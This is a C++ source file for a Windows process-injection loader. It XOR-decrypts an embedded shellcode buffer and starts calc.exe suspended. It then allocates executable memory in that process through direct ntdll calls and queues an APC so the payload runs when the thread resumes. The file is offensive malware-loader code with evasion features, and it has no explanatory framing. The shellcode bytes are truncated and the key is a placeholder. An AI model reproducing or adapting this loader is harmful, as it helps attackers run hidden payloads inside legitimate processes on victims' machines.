#include <iostream>
#include <Windows.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern "C" NTSTATUS NTAPI NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern "C" NTSTATUS NTAPI NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

extern "C" NTSTATUS NTAPI NtQueueApcThread(
    IN HANDLE ThreadHandle,
    IN PVOID ApcRoutine,
    IN PVOID ApcArgument1 OPTIONAL,
    IN PVOID ApcArgument2 OPTIONAL,
    IN PVOID ApcArgument3 OPTIONAL
);

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
    int keyLength = key.length();
    for (int i = 0; i < length; i++) {
        data[i] = data[i] ^ key[i % keyLength];
    }
}

int main() {
    std::cout << "Current process PID is " << GetCurrentProcessId() << std::endl;
    system("pause");

    // shellcode 
    unsigned char buf[] =
    	"\x98\x7b\xe0\x96\xc1\x98\xb4\x69\x30\x6e\x2a\x62\x38\x34"
    	"..."
        
    //shellcode
    xorDecrypt(buf, sizeof(buf) - 1, "<DecryptionKey>");

    SIZE_T payload_size = sizeof(buf);

    char processPath[] = "C:\\Windows\\System32\\calc.exe";

    STARTUPINFOA startprocess = { 0 };
    PROCESS_INFORMATION processinfo = { 0 };
    if (!CreateProcessA(processPath, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo)) {
        std::cout << "Failed to Create a New Process ! " << std::endl;;
        return 1;
    }

    HANDLE hprocess = processinfo.hProcess;
    HANDLE hthread = processinfo.hThread;

    PVOID remotebuffer = NULL;
    SIZE_T regionSize = payload_size;
    NTSTATUS status = NtAllocateVirtualMemory(hprocess, &remotebuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to allocate the memory!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    status = NtQueueApcThread(hthread, remotebuffer, NULL, NULL, NULL);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to queue APC thread!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    SIZE_T bytesWritten;
    status = NtWriteVirtualMemory(hprocess, remotebuffer, buf, payload_size, &bytesWritten);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to Write the memory!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    ULONG oldProtect;
    status = NtProtectVirtualMemory(hprocess, &remotebuffer, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to change the memory protection!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    ResumeThread(hthread);
    return 0;
}
